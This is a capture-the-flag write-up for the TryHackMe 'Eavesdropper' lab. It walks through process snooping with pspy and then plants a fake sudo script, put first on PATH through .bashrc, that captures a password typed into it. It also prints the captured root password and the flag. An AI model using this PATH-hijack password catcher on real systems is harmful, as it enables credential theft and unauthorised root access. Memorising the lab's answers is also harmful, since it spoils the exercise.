# TryHackMe Eavesdropper Writeup

## `Connect to ssh`

```ruby
chmod 600 id-rsa-1647296932800.id-rsa
ssh -i id-rsa-1647296932800.id-rsa frank@10.10.226.16
```

<img width="1041" height="472" alt="image" src="https://github.com/user-attachments/assets/84448f96-ac05-48a2-bc42-201fcf49f342" />

## **`linpeas`**

<img width="756" height="90" alt="image" src="https://github.com/user-attachments/assets/2a7c3706-f331-43fa-867a-651eb3c212e3" />

<img width="906" height="146" alt="image" src="https://github.com/user-attachments/assets/5aead914-827d-42a5-8de8-94777d5afa8d" />

> ## we don't have the password

What is **pspy**?
================

**pspy** is a small tool that monitors (snoop) processes on Linux **without root privileges**. You use `procfs` monitoring with `inotify` to catch short-lived processes (such as cron jobs, instantaneously executed scripts, or commands that pass passwords as args). Very useful in CTFs and testing environments to detect hidden cron, or see commands being executed with higher privileges.

```ruby
./pspy64 -c
```

<img width="1323" height="334" alt="image" src="https://github.com/user-attachments/assets/9a1a5673-a18e-4a73-812d-c64e2334a6c5" />

> This is weird, why root would use sudo? Looks like root is connecting through SSH to frank account. There is probably a cron job executing sudo in a unattended way so we'll be able to capture root password by capturing the intput. To do so we just have to change frank's PATH so a rogue sudo command would be executed.

> ## Create **`Fake sudo`**

```ruby
frank@workstation:~$ mkdir bin
frank@workstation:~$ cd bin/
frank@workstation:~/bin$ nano sudo
frank@workstation:~/bin$ cat sudo 
#!/bin/bash
read -p "Frank_password: " password
echo $password > /home/frank/pass.txt
frank@workstation:~/bin$ chmod +x sudo
```

<img width="849" height="193" alt="image" src="https://github.com/user-attachments/assets/3202e2c2-ec96-4a94-9e10-ce548f04085c" />

> ## Then we change frank's `PATH` so that the fake sudo will be loaded before the real one.

```ruby
nano .bashrc
export PATH=/home/frank/bin:$PATH
```

<img width="1068" height="527" alt="image" src="https://github.com/user-attachments/assets/9e5063e6-602b-4853-a2f3-6ec51907a9d2" />

## now getting root

```
!@#frankisawesome2022%*
```

<img width="747" height="187" alt="image" src="https://github.com/user-attachments/assets/846c64dc-f5c7-4742-8048-1ba74ad6ca2d" />

<img width="871" height="121" alt="image" src="https://github.com/user-attachments/assets/3fd567aa-dee3-491d-89ec-59347dc5abd5" />

```ruby
flag{14370304172628f784d8e8962d54a600}
```

